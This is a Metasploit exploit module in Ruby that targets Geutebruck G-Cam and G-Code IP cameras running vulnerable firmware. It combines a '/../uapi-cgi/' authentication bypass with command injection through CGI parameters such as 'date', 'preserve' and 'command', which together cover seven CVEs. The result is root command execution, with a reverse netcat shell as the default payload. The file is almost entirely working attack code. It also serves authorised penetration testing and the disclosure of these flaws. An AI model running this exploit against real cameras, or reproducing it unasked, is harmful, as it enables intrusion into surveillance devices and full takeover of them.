##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = ExcellentRanking
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::CmdStager
    prepend Msf::Exploit::Remote::AutoCheck
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Geutebruck simple_reclistjs.cgi Remote Command Execution',
          'Description' => %q{
            This module bypasses authentication and exploits multiple authenticated arbitrary command execution vulnerabilities within various parameters
            of Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx, EFD-22xx,
            ETHC-22xx, and EWPC-22xx devices running firmware versions <= 1.12.0.27 as well as firmware 
            versions 1.12.13.2 and 1.12.14.5.
            Successful exploitation results in remote code execution as the root user.
          },
  
          'Author' => [
         'Titouan Lazard - RandoriSec', # Discovery
         'Ibrahim Ayadhi, SÃ©bastien Charbonnier - RandoriSec', # Metasploit Module
          ],
          'License' => MSF_LICENSE,
          'References' =>
            [
              ['CVE', 'CVE-2021-33552'],
              [ 'URL', 'http://geutebruck.com' ],
              [ 'URL', 'https://www.randorisec.fr/udp-technology-ip-camera-vulnerabilities/'],
              [ 'URL', 'https://us-cert.cisa.gov/ics/advisories/icsa-21-208-03']
            ],
          'DisclosureDate' => '2021-07-08',
          'Privileged' => true,
          'Platform' => ['unix', 'linux'],
          'Arch' => [ARCH_CMD],
          'Targets' => [
            [ 'CVE-2021-33544 - certmngr', {
              'http_method' => 'GET',
              'http_vars' => { 'action' => "createselfcert", 'local' => "a", 'country' => "aa", 'state' => "$(PLACEHOLDER_CMD)", 'organization' => "a", 'organizationunit'=> "a", 'commonname' => "a", 'days' => "1", 'type' => "a"  },
              'uri' => '/../uapi-cgi/certmngr.cgi',
            } ],
            [ 'CVE-2021-33548 - factory', {
              'http_method' => 'GET',
              'http_vars' => { 'preserve' =>  "test$(PLACEHOLDER_CMD)"},
              'uri' => '/../uapi-cgi/factory.cgi',
            } ],
            [ 'CVE-2021-33550 - language', {
              'http_method' => 'GET',
              'http_vars' => { 'date' => "$(PLACEHOLDER_CMD)" },
              'uri' => '/../uapi-cgi/language.cgi',
            } ],
            [ 'CVE-2021-33551 - oem', {
              'http_method' => 'GET',
              'http_vars' => { 'action' => "set", 'enable' => "yes", 'environment.lang' => "$(PLACEHOLDER_CMD)"},
              'uri' => '/../uapi-cgi/oem.cgi',
            } ],
            [ 'CVE-2021-33552 - reclistjs', {
              'http_method' => 'GET',
              'http_vars' => { 'action' => 'get' , 'timekey'=>'2333','date'=> "$(PLACEHOLDER_CMD)" },
              'uri' => '/../uapi-cgi/simple_reclistjs.cgi',
            } ],
            [ 'CVE-2021-33553 - testcmd', {
              'http_method' => 'GET',
              'http_vars' => { 'command' => "PLACEHOLDER_CMD" },
              'uri' => '/../uapi-cgi/testcmd.cgi',
            } ],
            [ 'CVE-2021-33554 - tmpapp', {
              'http_method' => 'GET',
              'http_vars' => { 'appfile.filename' => "2.zip$(PLACEHOLDER_CMD)" },
              'uri' => '/../uapi-cgi/tmpapp.cgi',
            } ]
          ],
          'DefaultTarget' => 0,
          'DefaultOptions' =>
           {
             'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'
           }
        )
      )
    end
  
    def firmware
      begin
        res = send_request_cgi(
          'method' => 'GET',
          'uri' => '/brand.xml'
        )
        unless res
          vprint_error 'Connection failed'
          return CheckCode::Unknown
        end
  
        res_xml = res.get_xml_document
        @version = res_xml.at('//firmware').text
        return true
      end
    end
  
    def check
      result = firmware
      return result unless result == true
  
      version = Gem::Version.new(@version)
      vprint_status "Found Geutebruck version #{version}"
      if version <= Gem::Version.new('1.12.0.27') || version == Gem::Version.new('1.12.13.2') || version == Gem::Version.new('1.12.14.5')
        return CheckCode::Appears
      end
  
      CheckCode::Safe
    end
  
    def exploit
      print_status("#{rhost}:#{rport} - Attempting to exploit...")

      method = target['http_method']
      if method == 'GET'
        http_method_vars = 'vars_get'
      else
        http_method_vars = 'vars_post'
      end

      http_vars = target['http_vars']
      http_vars.each do | (k, v) |
        if v.include? "PLACEHOLDER_CMD"
          http_vars[k]["PLACEHOLDER_CMD"] = payload.encoded
        end
      end

      send_request_cgi(
        {
          'method' => method,
          'uri' => target['uri'],
          http_method_vars => http_vars
        }
      )
    end
  end